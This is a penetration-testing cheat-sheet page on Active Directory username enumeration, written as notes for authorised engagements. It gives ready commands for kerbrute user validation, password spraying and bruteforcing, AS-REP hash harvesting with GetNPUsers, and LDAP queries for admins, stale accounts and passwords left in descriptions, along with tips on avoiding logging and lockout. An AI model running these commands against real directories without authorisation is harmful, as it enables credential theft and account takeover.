---
title: "Users"
---

# 👥 Users enumeration

> _Build a valid username list, then validate it against the DC. In AD, a valid username is already half a credential - it unlocks AS-REP roasting, Kerberoasting, password spraying, and SID enumeration._

## 📚 Resources

- [TheHackerRecipes - User enumeration](https://www.thehacker.recipes/ad/recon/user-enumeration)
- [kerbrute](https://github.com/ropnop/kerbrute) - fast Kerberos pre-auth username validator
- [username-anarchy](https://github.com/urbanadventurer/username-anarchy) - permute `firstname.lastname` into every corporate format

## 🧭 Workflow

1. **Build a username list** - OSINT (LinkedIn, GitHub, metadata) + permute with username-anarchy.
2. **Validate** against the DC via Kerberos pre-auth (`kerbrute`) - no log 4625, no lockout.
3. **Enrich** via LDAP once you have any valid creds (job titles, `adminCount`, stale accounts).
4. **Pivot** to spraying / AS-REP roast / Kerberoast.

## 📝 Build the wordlist

Refer to this [cheatsheet](../../pentest-basics/wordlist/custom-wordlist.md)

```bash
# Permute real names into AD-style usernames
username-anarchy -i names.txt > users.txt

# Known public sources
# - LinkedIn (company page -> People)
# - GitHub commits (git log --all --format='%ae')
# - Document metadata (exiftool on public PDFs/DOCX)
```

## 🎯 Kerbrute (pre-auth validation)

> _Queries Kerberos AS-REQ with no password - a valid user returns `KDC_ERR_PREAUTH_REQUIRED`, an invalid one `KDC_ERR_C_PRINCIPAL_UNKNOWN`. No 4625 event, no account lockout on userenum._

```bash
# User discovery (no lockout risk)
kerbrute userenum -d $DOMAIN --dc $DC_IP users.txt

# Password spray - CHECK pass policy first (see enumeration/index.md)
kerbrute passwordspray -d $DOMAIN --dc $DC_IP users.txt '$PASSWORD'   # one password, many users

# Single-user bruteforce (noisy - triggers lockout)
kerbrute bruteuser -d $DOMAIN --dc $DC_IP passlist.txt $USER --safe   # --safe stops on lockout
```

## 🔎 GetNPUsers as existence oracle

> _Even without `-no-pass` creds, `GetNPUsers` tells you which users exist AND which have `DONT_REQ_PREAUTH` set (= AS-REP roastable). Two birds, one request._

```bash
# User validation + AS-REP roast harvest in one shot
GetNPUsers.py $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $DC_IP

# Authenticated - dump every DONT_REQ_PREAUTH user hash
GetNPUsers.py $DOMAIN/$USER:$PASSWORD -request -dc-ip $DC_IP -format hashcat -outputfile asrep.hash
```

See [AS-REP roast](/active-directory/kerberos/roasting/asrep-roast.md) for cracking.

## 🧬 LDAP targeted queries (authed)

> _Once you have any valid creds, LDAP gives you more than SAMR: descriptions (often with passwords), job titles, last logon, admin flags._

::: code-group

```bash [all users]
nxc ldap $DC_IP -u $USER -p $PASSWORD --users
```

```bash [descriptions]
# Admins love putting temp passwords in the description field
nxc ldap $DC_IP -u $USER -p $PASSWORD -M get-desc-users
```

```bash [admins]
# Users with adminCount=1 - current or former privileged accounts
ldapsearch -LLL -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASSWORD" \
  -b "DC=${DOMAIN//./,DC=}" "(&(objectClass=user)(adminCount=1))" sAMAccountName
```

```bash [stale]
# Users who never logged on - good targets for pre-created accounts with default pw
ldapsearch -LLL -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASSWORD" \
  -b "DC=${DOMAIN//./,DC=}" "(&(objectClass=user)(lastLogon=0))" sAMAccountName
```

:::

## 📌 Tips

- Kerbrute `userenum` is **the** safe starting point - no password submitted, no lockout, minimal logging.
- SAMR-based enumeration (`rpcclient enumdomusers`, `lookupsid`) is covered in [135-msrpc.md](/network/services-pentesting/135-msrpc.md) - use it when you already have creds, not for discovery.
- Always check pass policy ([enumeration/index.md](./index.md#password-policy)) before spraying - one burned account can end the engagement.
